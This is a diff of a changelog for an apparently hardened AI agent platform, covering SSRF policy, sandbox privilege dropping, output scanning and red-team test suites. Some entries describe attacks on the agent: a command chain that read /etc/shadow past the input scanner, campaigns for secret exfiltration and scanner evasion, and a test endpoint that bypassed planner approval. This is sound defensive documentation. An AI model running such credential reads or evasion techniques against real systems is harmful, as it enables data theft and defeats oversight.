@@ -3,42 +3,45 @@
 All notable changes to Sentinel. Uses [Keep a Changelog](https://keepachangelog.com/) categories.
 
 For v0.1 migration history (Phases 0-6), see `archive/2026-02-17_v0.1-migration-changelog.md`.
+For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changelog-v0.2-to-v0.3.md`.
 
 ---
 
-## v0.5.0 — 2026-03-28
-
-The autonomy and hardening release. Multi-user authentication, goal verification with planner-as-judge, deterministic anchor allocation, cross-language code fixer, and a complete 17-module security audit remediation.
-
-### Added
-- **Multi-user authentication** — JWT-based auth with PIN login, per-user workspaces, settings panel, admin user management. Session keys and credentials managed via Podman secrets. 1-hour token TTL with JTI revocation
-- **Goal verification** — planner-as-judge system with 3-tier verification (tool output scan → assertion evaluation → planner judgement). Stagnation detection triggers judge-driven replanning. 7 assertion types with path sandboxing
-- **Anchor allocator** — deterministic structural anchors for `file_patch` targeting. AST-based parsers for Python, HTML, CSS, Shell, YAML, JSON, TOML. Tiered allocation (unique → positional → line-range), idempotent re-allocation, episodic memory integration
-- **Cross-language code fixer** — detects and repairs when the worker outputs code in the wrong language (e.g. Python in a JS file). Structural integrity validation as final pipeline step
-- **Plan-outcome memory** — episodic records now store full plan JSON, phase tracking, compact plan lines, and `[PARTIAL]`/`[ABANDONED]` markers for learning from failures
-- **Log viewer** — browser-based SSE log viewer with task filtering, clickable task IDs, CRLF normalisation
-- **GitHub release tooling** — manifest-based sanitisation script, paranoia scan, allowlist-only file copying
+## 2026-04-30
 
 ### Changed
-- **Planner model: Opus 4.6** — switched from Sonnet 4.6 for episodic memory seeding quality
-- **Scanner hardening** — Unicode escape decoding, expanded vulnerability fingerprints, PowerShell/PHP/socat/telnet/openssl detection, structured debug logging, strict mode for execution-bound output, context classifier extraction
-- **5,252 Python + 50 Rust** unit tests (up from 4,550 + 50 in v0.4.0)
 
-### Fixed
-- Rate limiter was a no-op — `SlowAPIMiddleware` now registered
-- Cross-user streaming isolation (SSE, WebSocket, logs)
-- Workspace path isolation for sites and file tools
-- CSP compliance — all JS extracted to external files
-- IMAP handler audit (1 HIGH closed)
-- Executor: session reset, dispatch caching, encoding, `max_results` parsing
+- **Telegram channel — PTB pin widened from 21.x to 22.x (C67 / Q11-FL5)** — `pyproject.toml` now declares `python-telegram-bot>=22.0,<23.0` (previously `>=21.0,<22.0`). C56's HTTPXRequest closure invariant was originally verified against PTB 22.6 in dev, while production containers had been resolving to 21.11.1 — a three-way pin/dev-venv/container drift. The pin update aligns container resolution with the verification basis. Sentinel's used PTB surface is fully compatible across 21.11.1 ↔ 22.7 (verified at C67.design): the two named PTB-22.0 breaking changes (`proxy_url` removal, `start_polling` per-call timeout-kwarg removal) are both invisible to Sentinel.
+  - **Operator-visible delta at next container rebuild.** Bot API HTTP connection pool default goes from 1 (PTB 21.x library default) to 256 (PTB 22.4+ library default — also Sentinel's explicit `telegram_connection_pool_size` setting). This is a throughput improvement; pool size 1 was a long-standing PTB 21.x foot-gun (one in-flight Bot API request would block subsequent ones). No configuration change required.
+  - **New build-time gate.** `container/Containerfile` now runs `tests/test_telegram_ptb_contract.py` immediately after `pip install`. Container builds fail fast if the resolved PTB doesn't satisfy the pin or doesn't expose the 10-setter `ApplicationBuilder` chain Sentinel uses. The contract test file has no Sentinel imports — it's deliberately refactor-pass-survivable.
+  - **Residual risk (deferred to FL-C67-a).** The C67 contract test does NOT cover `Bot.get_updates` formula constancy, `Bot.send_message` serialisation, or `Updater` lifecycle semantics across 22.x patches. A future PTB 22.x patch that quietly changes the `Bot.get_updates` `effective_read = configured + polling_timeout` formula would silently break Sentinel's getUpdates timeout budget without C67's contract test catching it. FL-C67-a (deferred row, ~100-200 LOC fake-`BaseRequest` harness) is the planned closure for this residual.
 
-### Security
-- **17/17 audit modules complete** — 175 findings across orchestrator, executor, code fixer, scanner, routines, sandbox, episodic memory, approval, provenance, policy engine, and UI. 0 HIGH remaining
-- **JWT hardening** — 1-hour TTL, JTI tracking, revocation set, CSRF origin check
-- **Auth isolation** — per-user memory, webhooks, routines, sessions. Admin pool for login bypass of RLS
-- **`spawn_task()` for ContextVar propagation** — user-scoped async tasks prevent cross-user context leaks
-- **Injection benchmark** — 130 tests, 0 exploits (expanded from 105 in v0.4.0)
-For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changelog-v0.2-to-v0.3.md`.
+---
+
+## 2026-04-26
+
+### Security (breaking)
+
+- **Email channel empty-allowlist now fail-closed (Q13-F14)** — an empty `email_channel_allowed_senders` setting now denies every inbound sender, matching Signal/Matrix/Telegram post-Q13.fix.c. Previously the gate short-circuited on empty (allow-all). Operators currently running `email_channel_enabled=True` with `email_channel_allowed_senders=""` will see all inbound mail dropped after upgrade until the allowlist is populated. The startup `audit.warning(event="channel.empty_allowlist", channel="email")` fires on boot to make the misconfiguration loud. Trust-model alignment per the universal contact-allowlist invariant; the prior triage rationale (envelope-auth backstop via SMTP/DMARC/SPF) was falsified — Sentinel performs no in-process envelope authentication.
+
+- **CalDAV URL canonicalisation now UTS-46 nontransitional (C65 / Q12-FL4 trust-boundary closure)** — Sentinel's SSRF validator now uses third-party `idna.encode(uts46=True, transitional=False)` for hostname canonicalisation, matching the IDNA profile that modern HTTP transport libraries (urllib3, httpx) use. Validator and transport now agree on the canonical A-label for inputs containing IDNA deviation characters (ß, final sigma, ZWJ/ZWNJ); the validator's canonical form is also substituted into the URL passed to `caldav.DAVClient`, so the transport resolves the same DNS name the validator approved. Closes a class of allowlist bypass where `https://faß.de/` would canonicalise to `fass.de` under the validator's old IDNA 2003 codec (matching an operator allowlist of `fass.de`) but resolve to `xn--fa-hia.de` under urllib3's UTS-46 mode (a different DNS name).
+  - **Operator-visible regression — underscore-bearing hostnames now rejected.** Hostnames with underscores in DNS labels (e.g. `caldav_server.lan`, common on self-hosted Nextcloud / Radicale internal hostnames) previously canonicalised through the stdlib codec and connected successfully. Under UTS-46 nontransitional these now fail-closed at PUT time (`HTTP 400`) and use time (`CalDAV URL rejected by SSRF policy: invalid IDNA hostname`). Underscores in DNS labels are an RFC violation; modern DNS validation increasingly rejects them. **Migration:** rename underscore-bearing hosts to use hyphens (`caldav-server.lan`) — most DNS servers (dnsmasq, BIND, systemd-resolved, `/etc/hosts`) accept this without further config changes — or use IP literals (`https://192.168.1.10:8443/dav`) which bypass IDNA entirely.
+  - **Allowlist-side note.** Matching for IDN allowlist entries is unchanged — operators with internationalised hostnames in `SENTINEL_SSRF_CALDAV_ALLOWLIST` should ensure entries are written in their UTS-46 nontransitional A-label form (e.g. `xn--fa-hia.de`, not `faß.de`); allowlist-side canonicalisation is a separate UX item not covered by this change.
+  - **Dependency.** `idna>=3.10,<4.0` is now an explicit dependency in `pyproject.toml` (previously transitive via httpx/requests). No additional install step for operators.
+
+---
+
+## 2026-04-23
+
+### Security (breaking)
+
+- **CalDAV credential URL SSRF policy (Q12-F1)** — credentials stored via `PUT /api/credentials/caldav` and the legacy system-wide `SENTINEL_CALDAV_URL` fallback are now gated by a deny-all allowlist + private-IP reject + HTTPS-only policy. The validator fires at PUT time (syntactic) and again at use time (DNS + private-IP reject). Any site that previously worked against a non-public homeserver (self-hosted NAS, internal LAN CalDAV) will now fail closed until an operator-visible allowlist is set. Redirects are also now forced off on every outbound CalDAV request (`allow_redirects=False`), closing the MITM/attacker-homeserver 3xx-pivot class. Residual DNS-rebind TOCTOU tracked under Q12-U1 (pin-connect deferred).
+- **New settings (all deny-all / HTTPS-only by default)**:
+  - `SENTINEL_SSRF_CALDAV_ALLOWLIST` — comma-separated hostnames or globs. `"*"` opens the gate. Empty = deny all CalDAV URLs. Example: `caldav.example.com,*.nextcloud.example.com`.
+  - `SENTINEL_SSRF_CALDAV_PRIVATE_HOST_ALLOWLIST` — comma-separated hostnames permitted to resolve into RFC1918 / loopback / link-local / CGN space (self-hosted NAS on `192.168.x.x`, etc.). Empty = reject all public hostnames that resolve private. Requires the host to ALSO be in `SSRF_CALDAV_ALLOWLIST`.
+  - `SENTINEL_SSRF_ALLOW_HTTP=true` — escape hatch to permit `http://` (default `false` enforces HTTPS-only).
+- **Upgrade path** — existing deployments with stored CalDAV credentials (or `SENTINEL_CALDAV_URL` set) MUST add the operator-visible hostname to `SENTINEL_SSRF_CALDAV_ALLOWLIST` before the next deploy, or CalDAV calendar operations will fail closed with `CalDAV URL rejected by SSRF policy: not_allowed`. See `docs/deploy-new-stack.md` §Upgrade notes.
+- **Rollback** — full pre-Q12 wide-open behaviour requires all three settings: `SENTINEL_SSRF_CALDAV_ALLOWLIST=*` + `SENTINEL_SSRF_CALDAV_PRIVATE_HOST_ALLOWLIST=*` + `SENTINEL_SSRF_ALLOW_HTTP=true`. **Partial rollback is preferable**: set `SSRF_CALDAV_ALLOWLIST=*` alone to re-enable public hosts without blanket-permitting private-IP reject bypass; use `SSRF_CALDAV_PRIVATE_HOST_ALLOWLIST` to opt specific internal hosts in by name rather than globally. Redirect-off enforcement is NOT rollback-able and remains forced on every outbound DAV request.
 
 ---
 
@@ -109,7 +112,6 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 
 ### Fixed
 - **Website serving bugfixes (4 issues from live testing)** — (1) `/sites` paths exempted from PIN auth middleware — browsers don't send `X-Sentinel-Pin` header on direct navigation (`auth.py`). (2) `resolve_args()` and `get_referenced_data_ids_from_args()` now recurse into nested dicts — fixes `{"index.html": "$dashboard_html"}` resolving to literal `$dashboard_html` (`orchestrator.py`). (3) Provenance trust gate exempted for `website` tool at TL4+ — Qwen output is always UNTRUSTED but website content is display-only, not executed (`orchestrator.py`). (4) Relaxed CSP for `/sites` paths — `script-src 'self' 'unsafe-inline'` allows inline JS in LLM-generated HTML; main UI CSP unchanged (`middleware.py`). 3 new tests (`test_middleware.py`, `test_orchestrator.py`). 2822 Python passed
-- **FIX-19: Documentation and missing context (8 findings)** — `handle_message()` comment explains async event bus delivery pattern (U1/WHY-1). `_flush_pruned_turns()` list_chunks() call now uses `source="system:session_prune"` filter instead of scanning all chunks — turns O(n) dedup into O(1) with indexed WHERE clause (U2/HANG-2). Think/RESPONSE tag stripping comment rewritten to explain Qwen3 thinking mode architecture leakage and tagged output format origin (U2/WHY-1). Three `POST-TEST REVIEW` TODOs replaced with `REVIEWED (B2 red team, 0 S0/S1)` resolved comments — data feeds planner (trusted), side-channel risk outside threat model (U2/WHY-2). `_NUM_PREDICT` constant moved to `sentinel/core/config.py` as `OLLAMA_NUM_PREDICT` — imported by both `quality_gate.py` and `ollama.py`, eliminating duplication and circular import risk (U3/WHY-1). `_CODE_EXTENSIONS` frozenset moved from inside `_file_write()` to module level in `executor.py` — no longer recreated per call (U4/WHY-2). Structured logging added to all IMAP and CalDAV public async functions — operation name, key params (truncated), result count, elapsed time (U6/TRACE-1). Comment on `String::from_utf8_lossy` in sidecar sandbox explaining binary output unsupported, lossy conversion intentional for JSON response (U7/WHY-1). 2605 Python passed (221 pre-existing infra-dependent failures), 8 Rust passed
 - **FIX-17: Code simplification (6 findings)** — Health check component-status logic (`_gather_component_status()`) extracted from three duplicate sites: `/health`, `/api/health`, and heartbeat `_health_check()`; each endpoint extends the shared dict with its own fields (U1/SIMP-1). CommandPatternScanner Dockerfile/Makefile exemption logic consolidated into `_is_safe_rm_in_build_context()` helper — replaces 8 near-identical checks across fenced, indented, and top-level contexts (U3/SIMP-1). Per-scanner crash handler in ScanPipeline extracted to `_run_scanner_safe()` static method — used by both `scan_input()` and `scan_output()` (U3/SIMP-2). Executor handler dispatch annotated with deferred-deduplication note — handler-per-tool pattern kept for readability at current tool count (U4/SIMP-1). `RoutineStore.list_event_triggered()` public method added; `RoutineEngine._on_event()` no longer accesses private `_row_to_routine`/`_mem` attributes (U6/HANG-1). `SidecarConfig` derives `Clone`; `SandboxEngine::new` uses `config.clone()` instead of manual field-by-field copy (U7/SIMP-1). 2798 Python passed, 50 Rust passed
 - **FIX-18: Hardcoded values to config (5 findings)** — Rate limit values in API decorators moved from hardcoded strings to `settings.rate_limit_tasks` / `settings.rate_limit_routines` using callable lambdas for runtime evaluation (U1/HARD-1). Heartbeat interval moved from hardcoded `asyncio.sleep(1800)` to `settings.heartbeat_interval` with `Field(default=1800, ge=60)` (U1/HARD-2). Direct shell timeout moved from hardcoded `timeout=30` to `settings.shell_timeout` with `Field(default=30, ge=5)`; podman timeouts (build=300s, run=60s, stop=30s) kept as constants with documenting comments (U4/HARD-1). Gmail/Calendar API timeouts already configurable via `settings.gmail_api_timeout` / `settings.calendar_api_timeout` — confirmed executor passes them through, no code change needed (U6/HARD-1). Sidecar `max_timeout_ms` (5min cap) and `stdout_max_bytes` (1 MiB) moved to `SidecarConfig` with `SENTINEL_SIDECAR_MAX_TIMEOUT_MS` / `SENTINEL_SIDECAR_STDOUT_MAX_BYTES` env var overrides; stderr buffer (64KB), epoch interval (500ms), and IO buffer request cap (1 MiB) kept as intentional constants with documenting comments (U7/HARD-1). 2798 Python passed, 50 Rust passed
 - **FIX-16: Dead code removal (5/7 findings, 2 invalid)** — `result =` assignment removed in `ChannelRouter.handle_message()` — orchestrator response delivered via event bus, return value unused (U1/DEAD-1). `PlanStep.requires_approval` field removed — approval is plan-level, field never read (U2/DEAD-2). `http_fetch` conditionally excluded from `get_tool_descriptions()` when sidecar unavailable — prevents planner generating plans that always fail (U4/DEAD-1). Dead `vobject` import removed from `_parse_event_from_vevent()` — imported but never referenced, function uses getattr on caldav objects (U6/DEAD-1). `ToolRegistry::register()` removed from sidecar — never called, all tools loaded via `load()` (U7/DEAD-1). Two findings rejected: U1/DEAD-2 (WebSocketChannel import is used at app.py:2266), U2/DEAD-1 (`expects_code` used in approval.py, UI, planner prompt — informational but not dead). 2798 Python passed, 50 Rust passed
@@ -189,38 +191,27 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 ### Changed
 - **IMAP search accepts empty/wildcard queries** — empty query or `*` now maps to IMAP `ALL` (list recent emails) instead of returning an error. Updated tool description hint to show supported query format (`from:X`, `to:X`, `subject:X`, `*`)
 - **Planner tool descriptions genericised** — replaced "Gmail messages" / "Google Calendar events" with "Email messages" / "Calendar events" in planner system prompt since backend is now IMAP/CalDAV
-- **CLAUDE.md startup context simplified** — removed mandatory `testing-status.md` read (testing phase complete), moved to on-demand
-
 ### Security
-- **B2 red team endpoint removed (Step 7 cleanup)** — deleted `sentinel/api/red_team.py` (POST `/api/test/execute-plan`), `sentinel/planner/trust_override.py` (ContextVar trust level override), `tests/test_red_team_endpoint.py` (28 tests). Replaced `get_effective_trust_level()` indirection with direct `settings.trust_level` / `self._trust_level` checks in `orchestrator.py` and `executor.py`. Removed `red_team_mode` config setting and router registration from `app.py`. The B2 endpoint bypassed planner and approval by design — mandatory removal before TL4 production. B2 test scripts in `scripts/` remain (they require the endpoint to be re-added + rebuild to run). Tests: 2,744 pass
 
 ### Changed
-- **TL4 activation approved** — Run 8 pipeline complete (7h 3m). G-suite: G1 85%, G2 78%, G3 63%, G4 93% (complex plans all complete — timeout fix confirmed), G5 100%. Red team: 0 S0/S1 across B1-B4, 6 consecutive clean runs (~300 exchanges). Remaining failures are Qwen 14B model ceiling. Next: set `SENTINEL_TRUST_LEVEL=4` in compose + rebuild
 
 ### Added
-- **Pipeline analysis phase (Phase 3)** — `run_pipeline.sh` now auto-generates assessment reports after validation and red team phases. G-suite JSONL files analysed via `analyse_functional_results.py`, un-analysed red team results via `analyse_red_team.py`. Consolidated summary written to `docs/assessments/pipeline_<timestamp>.md` with results table and links to per-suite reports. New `--skip-analysis` flag. Signal notifications after each analysis batch completes. JSONL collection uses `find -newer $LOG_FILE` to scope to current run only
 
 ### Fixed
 - **Scanner false positive on Qwen `<think>` blocks** — `scan_output()` in `pipeline.py` ran on the full Qwen response including `<think>` reasoning blocks. Qwen references system paths (`/proc/self/status`, `/etc/shadow`) during internal reasoning, triggering `SensitivePathScanner` false positives (18 of 22 `/proc/` matches in c4_monitoring were inside `<think>`). Think blocks are never written, executed, or shown to users — the orchestrator strips them before any downstream use. Fix: strip `<think>...</think>` from scan text before `scan_output()` and echo scanner. `tagged.content` and `raw_response` on `SecurityViolation` retain the full response (orchestrator handles content strip, forensics need the raw). 2 new tests: think-blocks-not-scanned + real-violations-still-caught
 - **Stale tmpfs noexec test assertion** — `test_sentinel_tmpfs_noexec` asserted `/tmp` must have `noexec`, but signal-cli GraalVM native binary extracts `libsignal_jni` to `/tmp` at runtime, so `noexec` was intentionally removed from compose. Renamed to `test_sentinel_tmpfs_mounted`, kept tmpfs check, removed noexec assertion
-- **B4 red team false positives (post-Fix-X)** — 5 test failures from overnight pipeline, all test bugs not security bugs. (1) Tests 4.4.4/4.8.5: `setuid(65534)` was a POSIX no-op after Fix X dropped code to UID 65534 — changed to `setuid(0)` to test escalation TO root. (2) Tests 4.12.1/4.12.4: selftest container config used old fields Podman ignores (`NetworkDisabled`, `NoNewPrivileges`) — added Fix W workarounds (`NetworkMode: "none"`, `SecurityOpt: ["no-new-privileges"]`). (3) Test 4.15.1: `unshare --user` succeeds by design on modern kernels (unprivileged user namespaces) — downgraded from fail to warn. (4) Exit code: B4 exited 1 on any test failure, killing the pipeline via `set -euo pipefail` — changed to always exit 0, consistent with B1/B1.5/B2. Result: 58 pass, 0 fail, 15 warn
-- **G-suite timeout cascade on complex plans** — G4 complex plans (c1-c5) reported "The read operation timed out" with 0 steps. Root cause: `/api/task` is synchronous — blocks until full plan+execute cycle completes. Complex 8-step plans take 400-1000s (Qwen ~200s/step), but HTTP timeout was 600s. Test harness retried 3× from scratch, burning 1845s total. Changes: `REQUEST_TIMEOUT` 600→1800s (all 7 test scripts), `MAX_RETRIES` 3→2 (initial + 1 retry), `claude_timeout` 60→180s, `ollama_timeout` 120→600s. Note: `ollama_timeout` is a per-chunk idle timeout (httpx), not a total generation cap — Ollama keeps-alive via chunked encoding so it never actually fires. Real generation cap is `num_predict=8192` tokens
 
 ---
 
 ## 2026-02-28
 
 ### Security
-- **Tool output scanning (Fix W-Output)** — tool_call results (shell_exec stdout, file_read content, etc.) were never scanned. B2 red team found `cat /workspace/targets.txt | xargs cat` could read `/etc/shadow` content — input scanner said "clean" (no sensitive paths in the command string) and no output scanner ran. Fix: `_execute_tool_call()` now calls `scan_output()` on tool output before it enters execution context. Scans run before exit code check so even "failed" commands get scanned. Fail-closed on scanner crash. Scan results stored in TaggedData for audit trail. SAFE handlers (health_check, memory, session_info) are not scanned — they return before ToolExecutor path. 8 new unit tests
 - **Non-root sandbox execution (Fix X)** — sandbox commands now run as UID 65534 (nobody) instead of root. Container starts as root (needed to chmod workspace), then drops privileges via `setpriv --reuid=65534 --regid=65534 --clear-groups` before executing the user command. Defence-in-depth: `/etc/shadow` is OS-level unreadable regardless of output scanning. `setpriv` is a pure syscall wrapper — works on read-only rootfs and with NoNewPrivileges. Workspace gets `chmod 1777` (world-writable, sticky bit) so the non-root user can create files. 3 new unit tests
 - **Sandbox hardening gaps fixed (Fix W)** — Podman 4.9.3 silently ignores three Docker-compat API fields: `NetworkDisabled` (top-level), `NoNewPrivileges` (HostConfig), and `CapDrop: ["ALL"]` (normalised to individual caps). Added Podman-reliable equivalents: `NetworkMode: "none"`, `SecurityOpt: ["no-new-privileges"]`, `CapAdd: []`. Also added a post-create runtime inspection gate (`_verify_hardening()`) that verifies all security settings were applied before starting the container — catches silent field ignores at runtime. 3 new unit tests for the hardening gate
 
 ### Fixed
-- **B4 red team false positives** — 5 test checks that gave false results: 4.4.4 setuid(0) was always a no-op (changed to setuid(65534)), 4.4.6 PTRACE_TRACEME always succeeds on self (changed to PTRACE_ATTACH on PID 1), 4.8.5 ctypes setuid(0) same issue (changed to 65534), 4.12.3 CapDrop check failed because Podman normalises ["ALL"] to individual cap names (now accepts 11+ caps), 4.16.3 mount rw check used " rw" but mount outputs "(rw,relatime)" (simplified to "rw" substring)
 
 ### Added
-- **Red team v2 test scripts (B1-B4)** — complete rewrite of all red team tests incorporating security assessment recommendations (P1-P3) and 8 user additions. B1 v2: 12 campaigns (+2 env exfiltration). B1.5 v2: 10 campaigns (+3 Signal exfil, Signal injection, live Brave). B2 v2: 16 attack categories (+6: symlink non-sensitive, xargs chaining, output encoding evasion, Signal exfiltration, Semgrep evasion profiling, temporal persistence) + `--layer-bypass` flag + `_build_system_prompt()`. B3 v2: 11 sections (+5: /proc/self info leak, mount validation, Podman proxy enforcement, /proc/self exploitation, DNS side-channel). B4 v2: entirely new — 17 categories testing sandbox (L10) directly via PodmanSandbox API, bypassing L1-9 scanner/policy layers
-- **v2 red team pytest suite** — `tests/test_red_team_v2.py` with 60 tests validating all v2 scripts: campaign/category definitions, required fields, unique IDs, v2 additions present, original campaigns preserved, new functions (`_build_system_prompt`, AuditLogger, PlanValidator, RogueAttacker), B4Runner method coverage (17 async test methods), v1/v2 coexistence, shared library compatibility
 - **B2 v2 AuditLogger bugfix** — `AuditLogger.__init__` type changed from `Path` to `Path | str` with `Path()` wrapping. String paths caused `AttributeError: 'str' object has no attribute 'parent'`
 
 ### Security
@@ -231,8 +222,6 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 - **Sandbox volume mismatch** — sandbox containers mounted `sentinel-workspace` (unprefixed) instead of `sentinel_sentinel-workspace` (compose-prefixed). `file_write` wrote to the correct volume inside the sentinel container; `shell_exec` ran in a sandbox container against an empty volume. Root cause of all file-not-found errors in run 5 (~31 failures across all suites). Fix: added `SENTINEL_SANDBOX_WORKSPACE_VOLUME=sentinel_sentinel-workspace` to compose env
 - **Planner empty/invalid JSON responses** — Claude (Sonnet 4.6) returning empty responses on follow-up planning turns. Average response time 5.4s for failures vs 93.7s for successes — consistent with API-side issue under load. Fix: (1) reverted model to `claude-sonnet-4-5-20250929`; (2) added 3-attempt retry loop covering empty responses, invalid JSON (non-refusal), and HTTP 529 (overloaded). Refusals are never retried
 - **Sandbox log stream demux** — Podman container logs API returns multiplexed stream frames (8-byte header per frame). Code read raw bytes as text via `resp.text`, corrupting stdout/stderr with binary framing characters. Fix: added `_demux_stream()` in `sandbox.py` using `struct.unpack` to strip frame headers, switched to `resp.content` (bytes)
-- **G-suite excessive container restarts** — `run_functional_tests.sh` was designed for standalone use, managing its own compose settings and restarting containers on entry and exit. When called in a loop by `run_validation.sh` (5 suites), this caused 10 unnecessary container restarts (2 per suite). Fix: `run_validation.sh` now owns the compose lifecycle — saves settings once, sets test mode, restarts once, runs all suites with `--managed` flag, restores once on exit. `run_functional_tests.sh` accepts `--managed` to skip compose modification, container restarts, and EXIT trap. Standalone use (without `--managed`) works exactly as before. Also fixed hardcoded restore values in standalone mode to save/restore actual values (matching `run_red_team.sh` pattern) instead of hardcoding `full`/`false`/`false`
-- **Pipeline settle gap** — added 30-second settle between validation and red team phases in `run_pipeline.sh`
 - **Podman proxy keep-alive hang** — raw byte-relay proxy hung on upstream HTTP/1.1 keep-alive responses. Fix: inject `Connection: close` header before forwarding
 
 ### Changed
@@ -248,11 +237,8 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 
 ### Changed
 - **Podman socket mount renamed** — host socket now mounts to `/run/podman/podman-host.sock` (was `/run/podman/podman.sock`). Sandbox connects via proxy at `/tmp/podman-proxy.sock`. Direct socket no longer accessible from application code
-- **Non-zero exit codes now fail steps** — `_execute_in_sandbox()` sets `_last_exec_meta` (was missing, unlike direct shell path). Orchestrator checks exit code after tool execution; non-zero returns `status="failed"` and halts the plan. New `FAILED` enum value in `StepStatus`. **Risk:** commands like `grep` returning exit code 1 (no match) will now fail steps — this is intentional secure-by-default posture but may cause G-suite regression. Planner should handle retries
-- **Workspace cleanup between red team scenarios** — `run_red_team.sh` now calls `cleanup_workspace()` (clears `/workspace/*`) before each scenario. Prevents cross-contamination from previous test artifacts (B2 chained_exfil left `/workspace/etc/shadow` behind)
 
 ### Fixed
-- **B3 Phase 2 ollama route false positive** — route check in `red_team_b3.sh` grepped for `0.0.0.0` in hex `/proc/net/route` output. Gateway `00000000` means "directly connected" on the internal-only network, not a default route. Fix: when parsing `/proc/net/route`, require both Destination=`00000000` AND Gateway!=`00000000` (non-zero gateway = actual external routing). `ip route` path uses `^default ` prefix match
 
 ### Security
 - **Podman socket exposure closed** — B3 Phase 2 proved the real Podman socket let code inside the sentinel container list all host containers and exec into sentinel-ollama. The new proxy allowlists only sandbox operations (create/start/wait/kill/logs/inspect/delete for `sentinel-sandbox-*` containers with the configured image). All other API calls return 403 Forbidden
@@ -263,21 +249,14 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 - **Medium plan thresholds widened** — `expected_steps_max` from 4 to 6 for m1, m3, m4, m5 in `functional_test_plans.py`. Claude consistently produces 5-7 steps for medium complexity; the old threshold (2-4) was too narrow
 - **Ollama context window bumped** — `OLLAMA_NUM_CTX` from 16384 to 20480 in `podman-compose.yaml`. Gives Qwen 3 14B more context for complex multi-step tasks. Conservative increase to stay within RTX 3060 12GB VRAM budget (weights ~8.9GB + KV cache). Needs VRAM verification after rebuild
 
-- **Pipeline runner** — `scripts/run_pipeline.sh` chains validation (rebuild + G-suite) and red team (B1, B1.5, B2, B3) into a single unattended pipeline. Signal messages at every phase transition. G-suite failures don't abort red team. Flags: `--skip-rebuild`, `--skip-gsuite`, `--skip-redteam`, `--no-signal`, `--dry-run`
-- **Signal notifications for red team** — `run_red_team.sh` now sends Signal messages at each scenario start/complete, matching `run_validation.sh` pattern. `--no-signal` flag to suppress
 
 ### Changed
-- **Script split: overnight → validation + red team** — `run_overnight.sh` replaced by two independent scripts: `run_validation.sh` (rebuild + G-suite functional tests + Signal notifications) and `run_red_team.sh` (self-contained security testing). They can run independently, together, or via `run_pipeline.sh`
-- **Red team B2 auto-toggle** — `run_red_team.sh` now automatically enables/disables `SENTINEL_RED_TEAM_MODE` in compose and restarts containers for B2 testing. No manual compose editing needed. EXIT trap cleans up on crash
 
 ### Fixed
-- **B2 red team endpoint HTTP 405** — static file catch-all mount at `/` (registered at module level) shadowed the red team route at `/api/test/execute-plan` (registered during lifespan). Routes added during lifespan are appended after the catch-all, so `StaticFiles` intercepted POST requests and returned 405 (only supports GET/HEAD). Fix: moved static mount into lifespan so it's always the last route registered. Verified with partial B2 run (34/40 submissions, 33 blocked, 1 safe pass, 0 exploits, 0 errors)
-- **Red team scripts use venv Python** — `run_red_team.sh` called bare `python3` (system Python) for B1/B1.5/B2/analysis scripts, but `anthropic` module is only in `.venv`. Added `$PYTHON` variable pointing to `.venv/bin/python3`. Fixes `ModuleNotFoundError: No module named 'anthropic'` that blocked run 5 red team phase
 - **Code fence extraction with embedded doc fences** — Qwen generates Rust doc comments with `/// ````, causing `extract_code_blocks()` to find multiple blocks and fall through. Fix: outer-wrapping fence detection in `executor.py` peels the outer fence regardless of inner content. Fixes t1_rust_binary_search, t3_multistage_rust
 - **Planner over-planning execution steps** — Sonnet 4.6 + "plan from scratch" prompt caused planner to add `bash`/`sh` execution steps (which are in the blocked command list). Added prompt rule: "Do NOT plan steps to execute, run, or test generated code/scripts". Fixes t1_bash_setup, t2_makefile_c_project
 - **Planner under-decomposing multi-file tasks** — Planner collapsed multi-file tasks into single steps, producing mixed output that triggers scanners. Added prompt rule: "When a request involves multiple distinct files, use separate steps per file". Fixes t3_multistage_rust
 - **PlanStep.description field optional** — Changed from required `str` to `str = ""` in models.py. Sonnet 4.6 occasionally omits this field, causing plan validation failure
-- **Red team --foreground flag** — `run_red_team.sh` now accepts `--foreground` as a no-op flag (overnight runner was passing it, causing arg parse failure and preventing red team from running)
 
 ---
 
@@ -290,12 +269,9 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 - **Test session isolation** — functional test scripts (plans, build, e2e, smoke) now include run timestamp in source keys (`functional_plans_{index}_{timestamp}`). Prevents session bleed between test runs (was causing c3 cascade-blocking across runs 2-3). Debug and deps scripts already had timestamps
 
 ### Added
-- **Overnight runner script** — `scripts/run_overnight.sh` runs full G-suite + red team (including B2) unattended. Sequence: container rebuild → G1-G5 at TL4 → enable RED_TEAM_MODE → full red team → disable RED_TEAM_MODE → summary. Optional Signal progress notifications. Flags: `--skip-rebuild`, `--skip-gsuite`, `--skip-redteam`, `--skip-b2`, `--no-signal`, `--dry-run`
 
 ### Fixed
 - **`.env` scanner false positives** — two new heuristics: (1) `_is_in_ignore_listing()` in strict input scanner (`scan()`) exempts `.env` when it appears in a comma-separated file-pattern list (≥3 pattern-like items, e.g. gitignore/containerignore listings in prose). (2) `_surrounding_is_ignore_listing()` in output scanner (`scan_output_text()`) exempts `.env` standalone lines when surrounding ±5 lines form an ignore-file listing (≥80% match, XML wrapper tags excluded). Fixes t1_gitignore and c3_full_stack step 11. 4 new tests
-- **Red team script crashes** — `_query()` in red_team_lib.py only caught `anthropic.APIError`, other exceptions (network errors, JSON decode) silently crashed the campaign. Broadened to `Exception`. Added top-level try/except handlers to B1, B1.5, B2 scripts. Added `PYTHONUNBUFFERED=1` to runner to prevent buffered output loss on crash
